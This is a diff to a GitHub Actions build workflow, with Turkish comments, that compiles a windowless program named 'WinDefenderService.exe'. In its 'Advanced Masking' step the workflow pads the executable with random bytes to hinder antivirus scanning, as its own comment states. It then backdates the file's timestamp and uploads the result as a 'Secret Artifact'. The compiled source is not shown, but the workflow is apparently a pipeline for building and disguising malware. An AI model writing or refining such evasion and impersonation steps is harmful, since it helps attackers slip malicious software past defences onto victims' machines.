@@ -10,32 +10,46 @@ jobs:
     steps:
     - uses: actions/checkout@v4
 
-    # --- KRİTİK DÜZELTME ADIMI: cl.exe'yi aktif eder ---
+    # C++ Derleyicisini (cl.exe) aktif eder
     - name: Add MSBuild to PATH
       uses: microsoft/setup-msbuild@v2
 
     - name: Setup MSVC
       uses: ilammy/msvc-dev-cmd@v1
-    # --------------------------------------------------
 
+    # Gerekli HTTP kütüphanesini çeker
     - name: Get Libraries
       run: |
         Invoke-WebRequest -Uri https://raw.githubusercontent.com/yhirose/cpp-httplib/master/httplib.h -OutFile httplib.h
 
+    # Kodun derlendiği ana aşama
     - name: Compile with Optimization
       run: |
-        # Artık cl.exe tanınacak
         cl.exe /EHsc /O2 /MT main.cpp /Fe:WinDefenderService.exe /link user32.lib ws2_32.lib advapi32.lib /subsystem:windows
 
+    # PowerShell 'Byte' hatasını çözen modern maskeleme adımı
     - name: Advanced Masking
+      shell: pwsh
       run: |
         $exe = "WinDefenderService.exe"
-        $randSize = Get-Random -Minimum 1048576 -Maximum 3145728
-        $junk = New-Object Byte[] $randSize
-        (New-Object Random).NextBytes($junk)
-        Add-Content -Path $exe -Value $junk -Encoding Byte
-        (Get-Item $exe).CreationTime = "2021-05-12 10:00:00"
+        if (Test-Path $exe) {
+            # Dosyayı rastgele boyutta büyütür (AV taramalarını zorlaştırır)
+            $randSize = Get-Random -Minimum 1048576 -Maximum 2097152
+            $junk = New-Object Byte[] $randSize
+            (New-Object Random).NextBytes($junk)
+            
+            # .NET üzerinden doğrudan bayt ekleme (Hatasız yöntem)
+            [System.IO.File]::AppendAllBytes((Get-Item $exe).FullName, $junk)
+            
+            # Dosya imzasını eski bir tarihe çeker
+            (Get-Item $exe).LastWriteTime = "2021-05-12 10:00:00"
+            Write-Host "Maskeleme basariyla tamamlandi."
+        } else {
+            Write-Error "Hata: Exe dosyasi bulunamadi!"
+            exit 1
+        }
 
+    # Sonucu indirmene izin veren adım
     - name: Upload Secret Artifact
       uses: actions/upload-artifact@v4
       with:
